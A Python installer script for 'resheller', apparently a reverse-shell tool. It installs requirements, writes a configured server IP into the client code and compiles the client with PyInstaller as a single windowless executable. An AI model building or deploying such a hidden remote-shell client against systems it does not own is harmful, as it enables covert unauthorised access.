#!/usr/bin/env python3
from argparse import ArgumentParser
from configparser import ConfigParser
from glob import glob
from importlib import util
from ipaddress import IPv4Address
from os import getcwd, name, path, remove
from shutil import copyfile, rmtree
from subprocess import Popen, PIPE, STDOUT
from sys import executable
from textwrap import wrap

from resheller.src.stdout.color import Color


class Make:
    """Call to resolve config paths and create uninitiated configs"""

    def __init__(self):
        self.repo = getcwd()
        self.conf_ini = path.join(self.repo, 'config.ini')
        self.package = path.join(self.repo, "resheller")
        self.client_dir = path.join(self.package, "src", "client")
        self.ip_file = path.join(self.client_dir, "ip.py")
        self.client = self.get_client()
        self.client_exe = self.get_client_path()

    def write_ip_file(self, ip):
        with open(self.ip_file, "w") as file:
            file.write("#!/usr/bin/env python3\n")
            file.write("def get_ip():\n")
            file.write("    return %s\n" % ip)
            file.close()

    @staticmethod
    def format_stdout(cmd, upgrade=False):
        proc = Popen(cmd, stdout=PIPE, stderr=STDOUT, encoding='utf8')
        stdout, _ = proc.communicate()
        stdout = stdout.splitlines()
        for line in stdout:
            line = wrap(line, 75)
            for row in line:
                if "Requirement already satisfied" in row:
                    return
                print(f"    {row}")
                if "You are using pip version" in row:
                    upgrade = True
        return upgrade

    @staticmethod
    def pip_exe(*args):
        cmd = [executable, "-m", "pip"]
        for arg in args:
            cmd.append(arg)
        return cmd

    def get_requirements(self):
        req_file = path.join(self.repo, "requirements.txt")
        with open(req_file, "r") as reqs:
            lines = reqs.readlines()
            reqs.close()
        return lines

    def install_requirements(self, uninstall=False):
        executed = False
        requirements = self.get_requirements()
        for line in requirements:
            line = line.split("=")[0]
            if not uninstall:
                upgrade = False
                if not util.find_spec(line) and not upgrade:
                    cmd = self.pip_exe("install", line)
                    upgrade = self.format_stdout(cmd, upgrade)
                    executed = True
                if upgrade:
                    cmd = self.pip_exe("install", "--upgrade", "pip")
                    self.format_stdout(cmd)
            else:
                if util.find_spec(line):
                    cmd = self.pip_exe("uninstall", "--yes", line)
                    self.format_stdout(cmd)
                    executed = True
        return executed

    def make_config(self):
        def_ini = path.join(self.package, "lib", 'default.ini')
        copyfile(def_ini, self.conf_ini)
        print(Color("Initiated config.ini:").grn())
        prompt = "    Enter target's IP in config file then run install.py"
        print(Color(prompt).ylw())
        exit(0)

    def get_ip(self):
        config = ConfigParser()
        conf_ini = path.join(getcwd(), 'config.ini')
        config.read(conf_ini)
        ipv4 = config["IP"]["server"]
        try:
            IPv4Address(ipv4.strip('"'))
        except ValueError as err:
            if "Enter target IP here" in ipv4:
                prompt = "    Enter target's IP in the config file (config.ini)"
                print(Color(prompt).red())
            else:
                print(Color(f"    Not a valid IPv4 Address:").b_red())
                print(f"    {Color(err).ylw()}")
            exit(0)
        self.write_ip_file(ipv4)

    def get_client_path(self):
        return path.join(self.repo, "dist", self.client)

    @staticmethod
    def get_client():
        if name == "nt":
            return "client.exe"
        return "client"

    def make_exe(self):
        client_py = path.join(self.client_dir, "client.py")
        if path.isfile(self.client_exe):
            print(Color("    Resheller already installed").ylw())
            print()
            print("Hint: Run install.py -r to reinstall")
        else:
            cmd = ["pyinstaller", "--onefile", "--noconsole", client_py]
            self.format_stdout(cmd)
            print(Color("    Installation Successful\n").ylw())
            print(Color(f"Find {self.client} in ./dist").grn())

    def install(self, requirements=True):
        print(Color("[Install]").b_grn())
        if not path.isfile(self.conf_ini):
            if requirements:
                print(Color("Installing package requirements:").grn())
                executed = self.install_requirements()
                if executed:
                    prompt = "    Package requirements satisfied\n"
                else:
                    prompt = "    Packages requirements already installed\n"
                print(Color(prompt).ylw())
            self.make_config()
        self.get_ip()
        print(Color("Installing package:").grn())
        self.make_exe()

    def rm_dirs(self):
        items = []
        for i in ["build", "dist"]:
            if path.isdir(i):
                try:
                    rmtree(i)
                    print(f"    {Color(path.basename(i)).ylw()}")
                    items.append(path.basename(i))
                except PermissionError as err:
                    print(Color(err).b_red())
                    print(f'Hint: Try looking for "{self.client}" '
                          f'in your running processes')
                    exit(0)
        return items

    def rm_ini(self, items):
        if path.isfile(self.conf_ini):
            remove(self.conf_ini)
            print(f"    {Color(path.basename(self.conf_ini)).ylw()}")
            items.append(path.basename(self.conf_ini))
        return items

    @staticmethod
    def rm_specs(items):
        specs = glob("*.spec")
        for spec in specs:
            try:
                remove(spec)
                print(f"    {Color(path.basename(spec)).ylw()}")
                items.append(path.basename(spec))
            except FileNotFoundError:
                pass
        return items

    @staticmethod
    def get_result(items):
        confirm = ''.join([str(f'{item}, ') for item in items])
        confirm = confirm.replace(", and,", " and")
        return confirm[:-2]

    @staticmethod
    def punctuate(items):
        length = len(items)
        if length > 1:
            items.insert((length - 1), "and")
        return items

    def clean(self, requirements=True):
        print(Color("[Clean]").b_grn())
        if requirements:
            print(Color("Removing package requirements:").grn())
            executed = self.install_requirements(uninstall=True)
            if executed:
                print(Color("    Package requirements removed\n").ylw())
            else:
                print(Color("    No requirements to uninstall\n").ylw())
        print(Color("Removing:").grn())
        items = self.rm_dirs()
        items = self.rm_ini(items)
        items = self.rm_specs(items)
        items = self.punctuate(items)
        print()
        if items:
            print(Color("Removed:").grn())
            print(f"    {Color(self.get_result(items)).ylw()}")
        else:
            print(Color("    Nothing to Remove").ylw())
        self.write_ip_file('"Enter target IP here"')

    def reinstall(self):
        print(Color("[Reinstall]").b_grn())
        print(Color("Running reinstall:").grn())
        if path.isfile(self.conf_ini):
            print()
            self.clean(requirements=False)
            print()
            if path.isfile(self.client_exe):
                requirements = False
            else:
                requirements = True
            self.install(requirements)
        else:
            print(Color("    Package is not installed").ylw())


def argument_parser():
    parser = ArgumentParser()
    parser.add_argument("-c", "--clean", action="store_true")
    parser.add_argument("-r", "--reinstall", action="store_true")
    return parser.parse_args()


def main():
    make = Make()
    args = argument_parser()
    if args.clean:
        make.clean()
    elif args.reinstall:
        make.reinstall()
    else:
        make.install()


if __name__ == '__main__':
    main()
